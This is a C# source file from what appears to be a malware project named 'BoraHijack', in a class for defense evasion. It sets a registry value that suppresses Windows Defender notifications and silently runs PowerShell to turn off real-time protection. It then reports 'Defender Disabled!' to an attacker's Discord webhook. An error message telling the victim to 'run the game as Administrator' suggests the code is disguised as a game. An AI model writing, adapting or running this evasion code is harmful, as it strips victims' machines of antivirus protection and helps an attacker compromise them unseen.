using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Win32;
using Discord;
using Discord.Webhook;
using System.Diagnostics;

namespace BoraHijack.Evasion
{
    class Defender
    {
        public static async Task Main3(string webhookURL)
        {
            try
            {
                // Registry path for Defender notifications
                string keyPath = @"SOFTWARE\Microsoft\Windows Defender Security Center\Notifications";
                var client = new DiscordWebhookClient(webhookURL);

                using (RegistryKey key = Registry.LocalMachine.CreateSubKey(keyPath))
                {
                    if (key != null)
                    {
                        // Set 'DisableEnhancedNotifications' to 1 (DWORD)
                        key.SetValue("DisableEnhancedNotifications", 1, RegistryValueKind.DWord);
                        Console.WriteLine();
                        await client.SendMessageAsync(
                            text: "",
                            username: "BoraHijack",
                            avatarUrl: "https://files.catbox.moe/zteeqk.png",
                            isTTS: false,
                            embeds: new[] { new EmbedBuilder().WithTitle("Defender Disabled!").WithDescription("BoraHijack has disabled Defender").WithFooter("Made by vanity (v1s0or)").Build() }
                         );

                        Process.Start(new ProcessStartInfo
                        {
                            FileName = "powershell",
                            Arguments = "Set-MpPreference -DisableRealtimeMonitoring $true",
                            Verb = "runas", // runs as admin
                            UseShellExecute = false,
                            CreateNoWindow = true
                        });
                    }
                    else
                    {
                        // do noting :broken_heart:
                    }
                }
            }
            catch (UnauthorizedAccessException)
            {
                Console.WriteLine("Run the game as Administrator.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
        }
    }
}
